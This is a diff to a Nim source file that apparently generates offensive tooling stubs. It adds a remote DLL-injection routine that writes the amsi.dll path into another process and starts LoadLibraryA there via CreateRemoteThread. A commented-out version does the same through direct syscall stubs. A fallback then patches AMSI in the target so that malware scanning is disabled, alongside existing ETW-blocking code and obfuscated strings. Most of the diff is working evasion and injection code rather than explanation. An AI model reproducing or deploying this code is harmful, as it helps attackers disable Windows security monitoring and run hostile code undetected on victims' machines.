@@ -494,6 +494,176 @@ when isMainModule:
     echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
 """
 
+let RemoteLoadAMSIStub* = """
+
+proc remoteLoadLib(processID: var DWORD): bool =
+
+   
+    # C:\windows\system32\amsi.dll
+    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
+     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
+    #[
+    echo obf("[*] Loading amsi.dll in the remote process: "), processID
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = processID
+
+    let tProcess2 = MyGetCurrentProcessId()
+    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+
+    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
+    let syscallStub_NtOpenP = MyVirtualAllocEx(
+    pHandle2,
+    NULL,
+    cast[SIZE_T](SYSCALL_STUB_SIZE),
+    MEM_COMMIT,
+    PAGE_EXECUTE_READ_WRITE
+    )
+
+    
+    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
+
+
+    var oldProtection: DWORD = 0
+
+    # define NtOpenProcess
+    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
+    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtAllocateVirtualMemory
+    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
+    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtWriteVirtualMemory
+    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
+    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    # define NtCreateThreadEx
+    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
+    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
+
+    var status: NTSTATUS
+    var success: BOOL
+
+    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
+    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
+    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
+    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
+
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+    echo obf("[*] NtOpenProcess: "), status
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+    echo obf("[*] NtCreateThreadEx: "), status
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+
+    if(status == 0):
+      return true
+    else:
+      return false
+    # This doesn't work so far for some reason
+    success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
+    if (success):
+      echo obf("set back old protect")
+    echo success
+]#
+
+    echo "[*] Target Process: ", processID
+
+    let pHandle = OpenProcess(
+        PROCESS_ALL_ACCESS, 
+        false, 
+        cast[DWORD](processID)
+    )
+    defer: CloseHandle(pHandle)
+
+    echo "[*] pHandle: ", pHandle
+
+    let rPtr = VirtualAllocEx(
+        pHandle,
+        NULL,
+        cast[SIZE_T](friendlycode.len),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READ_WRITE
+    )
+
+    var bytesWritten: SIZE_T
+    let wSuccess = WriteProcessMemory(
+        pHandle, 
+        rPtr,
+        addr friendlycode,
+        cast[SIZE_T](friendlycode.len),
+        addr bytesWritten
+    )
+    
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
+ 
+    echo "[*] WriteProcessMemory: ", bool(wSuccess)
+    echo "    \\-- bytes written: ", bytesWritten
+    echo ""
+
+    let tHandle = CreateRemoteThread(
+        pHandle, 
+        NULL,
+        0,
+        pfnThreadRtn,
+        rPtr, 
+        0, 
+        NULL
+    )
+    defer: CloseHandle(tHandle)
+
+    echo "[*] tHandle: ", tHandle
+    echo "[+] Injected"
+
+    var oldProtect: PDWORD = nil
+    #var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](friendlycode.len),PAGE_READWRITE,oldProtect)
+    #echo $GetLastError()
+    #echo status
+    return true
+
+
+"""
+
 let RemotePatchAMSIStub* = """
 
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
@@ -562,6 +732,9 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
 when isMainModule:
     var hProcams = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
+    if (success == 0):
+        success = remoteLoadLib(remoteProcID)
+        success = RemotePatchAmsi(hProcams)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
